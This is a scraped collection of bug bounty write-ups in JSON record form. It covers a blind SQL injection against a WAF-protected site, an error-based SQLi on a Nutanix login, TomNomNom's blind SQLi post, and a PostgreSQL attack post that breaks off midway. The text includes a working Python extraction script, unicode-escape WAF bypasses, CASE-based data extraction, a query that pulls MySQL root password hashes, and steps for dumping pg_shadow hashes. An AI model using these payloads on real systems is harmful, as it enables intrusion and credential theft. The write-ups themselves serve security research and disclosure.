any request that returns an error page (which means the query was evaluated to false) for 5 times to make sure we get response from the server not the WAF since the WAF was blocking random requests and it actually WORKED! import requests c = {} # cookies s = '_-@.abcdefghijklmnopqrstuvwxyz0123456789' res = '' restart = True x = 0 r = '' while(restart): restart = False for i in s: x = 0 if(i == '_'): i = '\\\\_' p = \"6214111' and (SELECT lower(user) from dual) like '\"+str(res)+str(i)+\"%,2222\" # SQL Query try: r = requests.post(\"https://target/vulnerable2/\",data={\"Nbr\":p}, headers=c) except requests.exceptions.Timeout as e: print \"Timed out\" if \"2222\" not in r.content: while(\"2222\" not in r.content and x < 5): ## repeat 5 times to make sure we are talking to the server :) r = requests.post(\"https://target/vulnerable2/\",data={\"Nbr\":p}, headers=c) x += 1 else: res+=str(i) print res , \"found\" restart = True break if \"2222\" in r.content: res+=str(i) print res , \"found\" restart = True break Again, bug hunted, silly WAF beaten, report sent and bounty granted! I wanted to write about another interesting SQL injection on the same program but since it's a little bit different and has nothing to do with the WAF, I will keep it for the next post. That's it for today, if you have any questions drop me a tweet @Zombiehelp54 Get link Facebook X Pinterest Email Other Apps Comments Unknown March 17, 2019 at 9:51 PM Hi sir .I think i found boolen based sql injection but problem is it is in image download functionality.so when I try to use version() in vulnerable column it isn't printing version.please help Reply Delete Replies Reply sathyaramesh April 9, 2019 at 11:27 PM I am reading your post from the beginning, it was so interesting to read & I feel thanks to you for posting such a good blog, keep updates regularly. Ethical Hacking Course in Chennai Hacking Course in Chennai Hacking Classes in Chennai Blue Prism Training in Chennai CCNA Course in Chennai Cloud Computing Training in Chennai Ethical Hacking Training in OMR Reply Delete Replies Reply Linda May 5, 2019 at 3:50 PM Noice Reply Delete Replies Reply Linda May 5, 2019 at 3:53 PM This comment has been removed by the author. Reply Delete Replies Reply Linda May 5, 2019 at 3:57 PM This comment has been removed by the author. Reply Delete Replies Reply Linda May 5, 2019 at 3:59 PM This comment has been removed by the author. Reply Delete Replies Reply Linda May 5, 2019 at 4:02 PM This comment has been removed by the author. Reply Delete Replies Reply sheela rajesh May 10, 2019 at 9:52 PM Your blog is more informative and inspirational to others.it gives wish to know more about this. JAVA Training in Chennai JAVA Training in Tnagar Selenium Training in Chennai Digital Marketing Course in Chennai Python Training in Chennai Big data training in chennai JAVA Training in Chennai Java Training in Velachery Reply Delete Replies Reply sathyaramesh July 5, 2019 at 11:45 PM Nice blog!! I hope you will share more info like this. I will use this for my studies and research. DevOps Training in Chennai DevOps foundation certification DevOps certification AWS Training in Chennai Cloud Computing Training in Chennai Data Science Training in Chennai DevOps Training in Anna Nagar DevOps Training in Vadapalani DevOps Training in Guindy DevOps Training in Thiruvanmiyur Reply Delete Replies Reply cynthiawilliams July 6, 2019 at 5:59 AM Learned a lot from your post and it is really good. Share more tech updates regularly. Ethical Hacking course in Chennai Ethical Hacking Training in Chennai Hacking course in Chennai ccna course in Chennai Salesforce Training in Chennai AngularJS Training in Chennai PHP Training in Chennai Ethical Hacking course in Tambaram Ethical Hacking course in Velachery Ethical Hacking course in T Nagar Reply Delete Replies Reply Rasi August 19, 2019 at 3:13 AM Thanks for sharing this Informative content. Power BI Training In Hyderabad Power BI Training Power BI Online Training Power BI Training Online Reply Delete Replies Reply Anbarasan14 September 3, 2019 at 11:09 PM Thanks for your blog; I really prefer this blog for my future reference. English Speaking Classes in Mulund IELTS Classes in Mulund German Classes in Mulund French Classes in Mulund Spoken English Classes in Chennai IELTS Coaching in Chennai English Speaking Classes in Mumbai IELTS Classes in Mumbai Spoken English Class in Anna Nagar IELTS Coaching in Tambaram Reply Delete Replies Reply kaushik September 5, 2019 at 2:27 AM Awesome article! You are providing us very valid information. This is worth reading. Keep sharing more such articles. Automation Anywhere Training in Chennai Automation courses in Chennai Machine Learning Training in Chennai Blue Prism Training in Chennai UiPath Training in Chennai Automation Anywhere Training in OMR Automation Anywhere Training in Porur Automation Anywhere Training in T Nagar Automation Anywhere Training in Velachery Reply Delete Replies Reply rtusharkumarrastogi January 13, 2020 at 9:13 PM Thank you for this great information. I’ve only had one Ultrasound guided injection my hip one time. I’ve been considering it for other issues and this information has been very helpful, things I didn’t know about. Regards Ultrasound guided injection Reply Delete Replies Reply datasciencecourse January 28, 2020 at 10:34 PM After reading your article I was amazed. I know that you explain it very well. And I hope that other readers will also experience how I feel after reading your article. artificial intelligence course in mumbai machine learning courses in mumbai Reply Delete Replies Reply digitaltucr January 29, 2020 at 9:49 PM I finally found great post here.I will get back here. I just added your blog to my bookmark sites. thanks.Quality posts is the crucial to invite the visitors to visit the web page, that's what this web page is providing. ExcelR Data Science training in Mumbai Reply Delete Replies Reply rama venkata February 23, 2020 at 9:22 PM Great blog!!try to create a blog for digital marketing and post Digital marketing course in Hyderabad-360DigiTMG Reply Delete Replies Reply bavisthra March 13, 2020 at 12:04 AM Study Artificial Intelligence Course with ExcelR where you get a great experience and better knowledge. Artificial Intelligence Course Location 1: ExcelR - Data Science, Data Analytics Course Training in Bangalore 49, 1st Cross, 27th Main BTM Layout stage 1 Behind Tata Motors Bengaluru, Karnataka 560068 Phone: 096321 56744 Hours: Sunday - Saturday 7AM - 11PM Location 2: ExcelR #49, Ground Floor, 27th Main, Near IQRA International School, opposite to WIF Hospital, 1st Stage, BTM Layout, Bengaluru, Karnataka 560068 Phone: 070224 51093 Hours: Sunday - Saturday 7AM - 10PM Reply Delete Replies Reply dataexpert March 26, 2020 at 1:43 AM Very nice job... Thanks for sharing this amazing and educative blog post! ExcelR Digital Marketing Class In Pune Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog Handlebars template injection and RCE in a Shopify app April 04, 2019 TL;DR We found a zero-day within a JavaScript template library called handlebars and used it to get Remote Code Execution in the Shopify Return Magic app. The Story: In October 2018, Shopify organized the HackerOne event \"H1-514\" to which some specific researchers were invited and I was one of them. Some of the Shopify apps that were in scope included an application called \"Return Magic\" that would automate the whole return process when a customer wants to return a product that they already purchased through a Shopify store. Looking at the application, I found that it has a feature called Email WorkFlow where shop owners can customize the email message sent to users once they return a product. Users could use variables in their template such as {{order.number}} , {{email}} ..etc. I decided to test this feature for Server Side Template injection and entered {{this}} {{self}} then sent a test email to myself and the email had [object Object] within ... Read more SQL Injection: Utilizing XML Functions in Oracle and PostgreSQL to bypass WAFs February 13, 2023 TL;DR. In this blog post we will be discussing how built-in XML functions in Oracle and PostgreSQL database management systems can be used to bypass web application firewalls (WAFs). I will be presenting two real-life examples from private bug bounty programs where traditional methods for bypassing WAFs were not effective. Introduction It's really frustrating when you find a valid SQL injection vulnerability, but there isn't much to do because of a WAF blocking most of your payloads. Many WAF rules can be bypassed using character case switching, comments, splitting the payload into multiple parameters, double URL encoding and many other methods that depend on how the target application and the WAF handle your requests. However, In the cases we are discussing in this blog, I was not able to bypass the WAF using common WAF bypass methods. Case 1: SQL Injection in an Oracle database - WAF bypass using REGEXP_LIKE() and DBMS_XMLGEN.GETXMLTYPE() *This is a private bug bounty prog... Read more Exploiting Out Of Band XXE using internal network and php wrappers August 06, 2019 Hello hackers, A couple of weeks ago I tweeted about exploiting an out of band XXE vulnerability with a firewall blocking all outgoing requests including DNS lookups, so here is the full story: This is a private bug bounty program so I won't be mentioning who the vendor is. As usual during a hacking night while navigating the target application I came across an endpoint that took a parameter called xml but its value was encrypted. Later I found out that XML data sent to the backend is encrypted in the client side before sent in HTTP requests which means that XML data might not be properly validated in the backend, so I wanted to modify it to be able to inject my own XXE payload. So what I first tried was to find the JavaScript function used to encrypt the XML and do the same for my custom XML payload, however, the application's JavaScript was minimized with WebPack which made it very hard to read and trace functions. To avoid the hassle of finding the JavaScript encrypting... Read more Powered by Blogger Theme images by Michael Elkan Mahmoud Gamal Visit profile Archive 2023 1 February 1 2019 2 August 1 April 1 2018 1 July 1 SQL Injection and A silly WAF 2017 2 June 1 February 1 2015 2 November 1 September 1 Show more Show less Labels google hackerone hacking javascript nodejs sandbox security SQL Injection WAF WAF ByPass xss Show more Show less Report Abuse"}
{"source_url": "https://blog.securitybreached.org/2018/09/08/sqli-bootcampnutanix-com-bug-bounty-poc/", "title": "SQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2018/09/08/sqli-bootcampnutanix-com-bug-bounty-poc/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty September 8, 2018 Share BugBounty POC 3 SQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC by MuhammadKhizerJaved Hey Guys, So Another Concise Report about an SQLi I recently Found One day i was just going through some Twitter posts and saw one of my friend replied to a tweet about a Swag pack As Some of you guys already know How Attractive such Tweets are so i decided to Test the Site that give him that Awesome Swag Pack So While Scanning Subdomains I saw an interesting subdomain that was http://bootcamp.nutanix.com/ and the subdomain had a Login Page At First i tried Different Combinations to see if i can get access to the panel but i wasn’t that lucky but i didn’t find anything…. So I decided to see if any other Vulnerability exists that i can use to Login or either get some sensitive information from the site So i fired Up Burp And at first send a random Email and password and captured the request it was similar to this POST /bootcamp/login HTTP/1.1 Content-Type: application/json Content-Length: 74 Referer: https://bootcamp.nutanix.com/ Host: bootcamp.nutanix.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Accept: */* {“email”:” [email protected] “,” password”:”passwordlol”} The Response of this was Invalid Username and Password. So Then I started Monitoring the Reposine of the Request Using Burp repeater whenever i change something in the request first i thought of getting an SQLi in the Headers but that didn’t work but then i added a simple 1’\\ to the Email Field the Response of this Request was Different from all of them It was a 500 Internal Server Error and Same Error when we put this on Password Parameter because that was Also vulnerable . HTTP/1.1 500 Internal Server Error X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 301 ETag: W/”12d-ZLo463k+ S1SW5Z9MTAnhrr4EGvI” Date: Mon, 16 Jul 2018 18:20:13 GMT Connection: keep-alive {“code”:”ER_PARSE_ERROR”,” errno”:1064,”sqlMessage”:”You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”\\”‘ at line 1″,”sqlState”:”42000″,”index”: 0,”sql”:”SELECT id from Users WHERE email=\\”1’\\”\\” AND password=\\”‘\\””} So This was indeed a surprise for me and was also fun to see the error after so many tries. Now the Next Part was to see if the SQLi is Exploitable any further ot not POST /bootcamp/login HTTP/1.1 Content-Type: application/json Content-Length: 74 Referer: https://bootcamp.nutanix.com/ Host: bootcamp.nutanix.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Accept: */* {“email”:”a\\”and(extractvalue( 1,concat(0x0a,@@version)))#”,” password”:”‘”} and this Gave an Output as expected HTTP/1.1 500 Internal Server Error X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 227 ETag: W/”e3- FF7tF7d8MmsLPb6vtq6tjDeVHHk” Date: Mon, 16 Jul 2018 18:23:09 GMT Connection: keep-alive {“code”:”ER_UNKNOWN_ERROR”,” errno”:1105,”sqlMessage”:” XPATH syntax error: ‘\\n8.0.11′”,”sqlState”:”HY000″ ,”index”:0,”sql”:”SELECT id from Users WHERE email=\\”a\\”and(extractvalue(1, concat(0x0a,@@version)))#\\” AND password=\\”‘\\””} At This Point Most of the People Report the issue but i thought i should test a bit further to show a better POC than this one so here’s another SS that i used to check it manually more At This Point I simply Put the POST request to SQLmap and the OutPut was I reported this Issue to the Security Team at [email protected] and they Quickly Patched the issue and Yayyyyeeee I was Awarded with an Awesome Swag Pack that is still In Transit xD also Special thanks to Mani Sir He Always Helps Me whenever i need help or guide related to something 👌 Thanks for Reading Guys 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty POC SQL Injection MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X 3 replies on “SQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC” Getting Started in Bug Bounty Hunting | Complete Guide says: August 30, 2019 at 11:14 am […] SQL Injection Vulnerability nutanix Muhammad Khizer Javed […] Loading... Reply Bug Bounty Methodology (TTP- Tactics,Techniques and Procedures) V 2.0 ~ Cyberzombie says: June 30, 2019 at 11:12 am […] SQL Injection Vulnerability nutanix by Muhammad Khizer Javed […] Loading... Reply Guide 001 |Getting Started in Bug Bounty Hunting.. – Muhammad Khizer Javed says: June 3, 2019 at 3:42 am […] SQL Injection Vulnerability nutanix by Muhammad Khizer Javed […] Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next ZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability – Bug Bounty POC Previous RCE Unsecure Jenkins Instance | Bug Bounty POC You may also like October 22, 2024 by MuhammadKhizerJaved From Staging to Full Admin Control In Prod: A Breakdown of Critical Authentication Flaws In this blog, I explore a real-world case of an Admin Panel Takeover caused by broken authentication and insecure configurations. By exploiting a misconfigured JWT token from a staging environment, full administrative access was gained to a production system, exposing sensitive user data and critical application controls. This case study emphasizes the dangers of default credentials, unsecured staging environments, and improperly scoped tokens, providing key lessons in security hygiene and best practices to prevent such vulnerabilities. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 0 Read More June 30, 2020 by MuhammadKhizerJaved Using Inspect Element to Bypass Security restrictions | Bug Bounty POC Hey guys so this blog post is about bug bounty report, I was able to Bypass Security restrictions by using inspect element and use Paid Features. About the Issue: The... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 4 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8", "title": "Making a Blind SQL Injection a Little Less Blind | by TomNomNom | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMaking a Blind SQL Injection a Little Less Blind | by TomNomNom | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Press enter or click to view image in full size Making a Blind SQL Injection a Little Less Blind TomNomNom 9 min read · Jul 28, 2018 -- 8 Listen Share Someone told me the other day that “no-one does SQL Injection by hand any more”. I want to tell you about a SQL Injection bug that I found and exploited manually. Disclaimer : for the most part, I’m going to take you down the ‘happy path’ here. There were many more dead-ends, far more frustration, and much more head scratching in the discovery and exploitation of this bug than any of this would imply. I’d hate for all of that to get in the way of a good story though, so anyway… I was looking at a JSON-RPC API on a target (a target with a bug bounty program; I’m a good boy, I am), when I spotted a telltale sign of a problem: a single quote in the parameter would throw an error: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [\" 2' \"] } tom@bash:~▶ curl -s $APIURL -d @payload .json // ERRORS! ERRORS EVERYWHERE! But with the quote wrapped in a MySQL comment, there was no error: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [\" 2/*'*/ \"] } tom@bash:~▶ curl -s $APIURL -d @payload .json // No errors; just results :) (I’m redacting the method name here to avoid disclosing the name of the target). After a little messing around trying to inject a UNION (and failing), and trying a few different characters, I eventually figured out my payload was probably being put inside an IN (...) clause. Strong evidence for that was that if I passed in just a 2 , each of the assets in the returned data structure had a type_id of 2 : tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [\" 2 \"] } tom@bash:~▶ curl -s $APIURL -d @payload .json | gron | grep type_id json.result.data.widget[5].assets[0]. type_id = 2 ; json.result.data.widget[5].assets[1]. type_id = 2 ; json.result.data.widget[5].assets[2]. type_id = 2 ; But if I passed in a comma-separated list of numbers, each of the assets had values for type_id that were included in the list I provided: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [\" 1,2,3,4,5,6,7,8,9,10 \"] } tom@bash:~▶ curl -s $APIURL -d @payload .json | gron | grep type_id json.result.data.widget[0].assets[0].type_id = 10; json.result.data.widget[0].assets[1].type_id = 8; json.result.data.widget[0].assets[2].type_id = 9; json.result.data.widget[1].assets[0].type_id = 10; json.result.data.widget[1].assets[1].type_id = 8; json.result.data.widget[1].assets[2].type_id = 9; json.result.data.widget[2].assets[0].type_id = 8; json.result.data.widget[2].assets[1].type_id = 10; json.result.data.widget[3].assets[0].type_id = 8; json.result.data.widget[3].assets[1].type_id = 9; json.result.data.widget[3].assets[2].type_id = 10; json.result.data.widget[4].assets[0].type_id = 8; json.result.data.widget[4].assets[1].type_id = 9; json.result.data.widget[4].assets[2].type_id = 10; json.result.data.widget[5].assets[0].type_id = 10; json.result.data.widget[5].assets[1].type_id = 8; json.result.data.widget[5].assets[2].type_id = 9; json.result.data.widget[5].assets[3].type_id = 2; json.result.data.widget[5].assets[4].type_id = 2; json.result.data.widget[5].assets[5].type_id = 2; That behaviour, and the relationship between widgets and assets , led me to believe that the query probably looked something like this: SELECT w.id, w.name, a.type_id FROM widgets w LEFT JOIN assets a ON ( a.widget_id = w.id AND a.type_id IN ( $IDS ) ) ...more SQL... I was pretty sure it was a LEFT JOIN because the same number of widgets were always being returned, only the number of assets attached to them would vary depending on the parameter; and I was fairly sure there was some more SQL after the JOIN (a LIMIT , ORDER BY , another JOIN , or something like that) and that’s what was preventing my earlier attempt at injecting a UNION statement from working. So, no way to directly exfiltrate data then. This SQLi is as blind as a dodo (what? Dodos are dead, and dead things can’t see). Binary Questions One of the fairly common ways to leverage a blind SQL Injection is to ask yes/no questions using an IF(expression, true, false) statement, and that was my very first thought. I knew already that if I provided an ID of 2 there would be some assets attached to the widgets , and if I provided an ID of 1 there would be no assets . So — in theory at least — I could use a subquery as my payload and have it return 2 for true and 1 for false . If there’s assets in the response the answer would be ‘yes’, and if there aren’t any the answer would be ‘no’. I decided I would test the theory by trying to figure out something simple: the hostname of the database server. The hostname on a MySQL server is stored in the hostname variable, and you can easily see it like this: mysql> SELECT @@hostname; +------------+ | @@hostname | +------------+ | girru | +------------+ 1 row in set (0.00 sec) These examples are being run on a machine of mine, named after the Babylonian god of fire. I always think it’s a good idea to test whatever you can locally instead of blindly (hah) trying to figure things out on the actual target, with no real feedback or error messages. Because I can only ask yes/no questions, to figure out the hostname I need to see if the first character is an a , if it’s a b , or c , and so on until I find the right character; then I can move on to the second character. You can do that by using the SUBSTRING() function: mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = \" a \", 2, 1); +---------------------------------------------+ | IF(SUBSTRING(@@hostname, 1, 1) = \"a\", 2, 1) | +---------------------------------------------+ | 1 | +---------------------------------------------+ 1 row in set (0.00 sec) Remember: a 1 in the result means ‘no’, and a 2 means ‘yes’. So, nope: not an a . mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = \" b \", 2, 1); +---------------------------------------------+ | IF(SUBSTRING(@@hostname, 1, 1) = \"b\", 2, 1) | +---------------------------------------------+ | 1 | +---------------------------------------------+ 1 row in set (0.00 sec) Not a b either… Cue the wavy time-travel lines… mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = \" g \", 2, 1); +----------------------------------------------+ | IF (SUBSTRING(@@hostname, 1, 1) = \"g\", 2, 1) | +----------------------------------------------+ | 2 | +----------------------------------------------+ 1 row in set (0.00 sec) Ah! It’s a g ! Now we can move on to the next character. With my test query running fine locally, I could try it as a payload on the JSON-RPC API. Fingers crossed! tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [ \" SELECT IF(SUBSTRING(@@hostname, 1, 1) = \\\"a\\\", 2, 1) \" ] } tom@bash:~▶ curl -s $APIURL -d @payload .json <HTML><HEAD> <TITLE> Access Denied </TITLE> </HEAD><BODY> <H1>Access Denied</H1> You don't have permission to access \" <redacted> \" on this server.<P> Reference&#32; <redacted> </BODY> </HTML> Dammit, dammit, dammit . Those pesky WAFs are always getting in my way. Thankfully, because the payload is JSON, I could easily obfuscate it to get around the WAF by using \\uXXXX escape sequences. Crisis averted: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [ \" \\u0053 ELECT \\u0049 F( \\u0053 UBSTRING(@@hostname, 1, 1) = \\\"a\\\", 2, 1)\" ] } tom@bash:~▶ curl -s $APIURL -d @payload .json | gron | grep type_id // No WAF error here; but no assets either! No WAF error, but no assets either; so if everything’s working as intended the hostname doesn’t begin with an a . Time to try the next letter! And the next one… And the next one… I worked my way through the alphabet until: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [ \"\\u0053ELECT \\u0049F(\\u0053UBSTRING(@@hostname, 1, 1) = \\\" r \\\", 2, 1)\" ] } tom@bash:~▶ curl -s $APIURL -d @payload .json | gron | grep type_id json.result.data.widget[5].assets[0].type_id = 2; json.result.data.widget[5].assets[1].type_id = 2; json.result.data.widget[5].assets[2].type_id = 2; Results! The hostname starts with an r ! It was at this point I decided that rather than try and figure out the second character in the hostname, I’d write up my findings and report them. I figured I had a pretty good POC and that they’d surely reward me for being the hacking god that — in that moment — I knew myself to be. Just in CASE In my report I said something like “ data exfiltration, whilst slow, could easily be scripted ”. Which is true , but it would still be a real pain to actually get any useful data out of the thing, wouldn’t it? Asking all of those yes/no questions would surely show up on somebody’s monitoring dashboard somewhere if you actually tried to use it for anything other than the shortest of strings. How can we make things a little faster? Maybe even a couple of orders of magnitude faster?! We need to go beyond binary questions, beyond trinary questions, and even beyond that!… OK, I made that sound a little more exciting that it really is: we can use a CASE statement. A CASE statement lets you do something like this: mysql> SELECT CASE SUBSTRING(@@hostname, 1, 1) -> WHEN \"a\" THEN 1 -> WHEN \"b\" THEN 2 -> WHEN \"c\" THEN 3 -> WHEN \"d\" THEN 4 -> WHEN \"e\" THEN 5 -> WHEN \"f\" THEN 6 -> WHEN \"g\" THEN 7 -> ... -> WHEN \"z\" THEN 26 -> END as result; +--------+ | result | +--------+ | 7 | +--------+ 1 row in set (0.00 sec) So, because the result of this query is 7 , I know the first character in @@hostname is g :) The slight problem here is that I couldn’t just neatly use the numbers 1 to 26 for each letter, because not all possible IDs had corresponding assets . I needed to find enough valid IDs to make this work. I wrote a little PHP script to save me from typing out the numbers from 1 to 100 and tried passing in 1,2,3...99,100 as the parameter. I used a little bit of command line trickery to find a list of all the unique valid IDs: tom@bash:~▶ cat genrange.php <?php $payload = [ \"jsonrpc\" => \"2.0\", \"method\" => \"getWidgets\", \"params\" => [ implode(\",\", range(1, 100)) ] ]; echo json_encode($payload); tom@bash:~▶ curl --compressed -s $APIURL -d @<(php genrange.php) | gron | grep type_id | awk '{print $NF}' | sort -nu 2; 9; 10; 11; ...snip... 37; 38; 39; 40; In total I found 31 valid IDs, which isn’t nearly enough to cover even the ASCII character set, but it’s enough to cover all the lower-case letters and even a few numbers for good measure. It’s also a lot better than only being able to answer yes/no questions. I knocked together another hacky PHP script to make generating my payload a little easier: tom@bash:~▶ cat gensql.php <?php // first argument to the script is the char to fetch $char = $argv[1]?? 1; // The payload $sql = ' SELECT CASE SUBSTRING(@@hostname, '.$char.', 1) WHEN \"a\" THEN 2 WHEN \"b\" THEN 8 WHEN \"c\" THEN 9 WHEN \"d\" THEN 10 ...snip... WHEN \"z\" THEN 35 WHEN \"0\" THEN 36 WHEN \"1\" THEN 37 WHEN \"2\" THEN 38 WHEN \"3\" THEN 39 WHEN \"4\" THEN 40 END '; $wrapper = [ \"jsonrpc\" => \"2.0\", \"method\" => \"getWidgets\", \"params\" => [$sql] ]; $payload = json_encode($wrapper); // Add some obfuscation to defeat the WAF :) echo str_replace( [\"C\", \"S\", \"T\", \"W\"], [\"\\u0043\", \"\\u0053\", \"\\u0054\", \"\\u0057\"], $payload ); (I probably could have generated all the WHEN \"x\" THEN y parts of the query with a loop but all I can say to that is: ¯\\_(ツ)_/¯) With my script in hand I could try and figure out the rest of that pesky hostname; using awk '{print $NF}' to print the last field (i.e. the type_id ), and uniq to remove the duplicates. First character: tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 1 ) | gron | grep type_id | awk '{print $NF}' | uniq 27 ; Consulting my lookup table, that’s an r ! Good, I knew that, so it looks like it’s working. More characters: tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 2 ) | gron | grep type_id | awk '{print $NF}' | uniq 11 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 3 ) | gron | grep type_id | awk '{print $NF}' | uniq 10 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 4 ) | gron | grep type_id | awk '{print $NF}' | uniq 2 ; 11 , 10 , and 2 ; that’s e , d , and a . Hmm, reda ? Let’s keep going… tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 5 ) | gron | grep type_id | awk '{print $NF}' | uniq 9 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 6 ) | gron | grep type_id | awk '{print $NF}' | uniq 29 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 7 ) | gron | grep type_id | awk '{print $NF}' | uniq 11 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 8 ) | gron | grep type_id | awk '{print $NF}' | uniq 10 ; 9 , 29 , 11 , and 10 … So that’s c , t , e , and d . Oh hey: it’s redacted ;) All joking (and redaction) aside, I actually was able to read the hostname at a rate of one character per request, or — and this is a bit of a guess — about 2 bits per second. Upping The Impact? Reading the hostname out of a variable isn’t really a big deal; I get that. So what else could you get? How about this (provided the database user in question has permission to read it): SELECT CASE SUBSTRING(( SELECT u.authentication_string FROM mysql.user u WHERE u.User = \"root\" ), 1, 1) WHEN \"*\" THEN 2 WHEN \"0\" THEN 8 WHEN \"1\" THEN 9 ...snip... WHEN \"E\" THEN 22 WHEN \"F\" THEN 23 END 42 requests or so later and you’ve got yourself a hash for offline brute-forcing. Much of the time of course, having the root MySQL password is pretty much useless because most sane people don’t allow direct access to their MySQL instances. It’s a neat trick though, huh? In a ‘real’ attack my first port of call would be the information_schema , so I could learn more about the schema and what other juicy data could be extracted. And I might have done that, had I not found a non-blind SQL Injection bug in the very next method I looked at 🙄 This was a fun bug. I appreciate it’s nothing truly groundbreaking, but I don’t find SQLi bugs very often so I thought it warranted a write-up :) Security Bug Bounty Sql Hacking -- -- 8 Written by TomNomNom 1.8K followers · 1 following Explainer, talker, coder, fixer, eater, not really a sheep. Responses ( 8 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@vishnu0002/attacking-postgresql-database-834a9a3471bc", "title": "Attacking PostgreSQL Database. This is write up in which I’ll explain… | by vishnuraj | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@vishnu0002/attacking-postgresql-database-834a9a3471bc. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAttacking PostgreSQL Database. This is write up in which I’ll explain… | by vishnuraj | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Attacking PostgreSQL Database vishnuraj 2 min read · Jul 16, 2018 -- 2 Listen Share This is write up in which I’ll explain a vulnerability I recently found, and reported through oracle bug bounty program. Vulnerability Explanation : PostgreSQL is a database that comes with MacOS X Lion, as a default standard database. According to wikipedia the majority of Linux distributions have the PostgreSQL in the supplied packages.So besides the regular databases (Oracle,MySQL etc.) there will be times as a penetration tester that we will need to assess and this database Network Mapping : Lets say that we have perform a port scan on a server and we have identify that is running a PostgreSQL database at port 5432 Press enter or click to view image in full size Vulnerability Identification : We will try a brute force attack in order to discover any weak credentials that will allow us then to connect to the database.We will open the metasploit framework and we will use the postgres_login scanner. Press enter or click to view image in full size Penetration Now that we have a valid username and password we can use that to connect to the database by using a psql client.The first query that we want to execute is the select usename, passwd from pg_shadow; because it will return to us the password hashes of the database from the 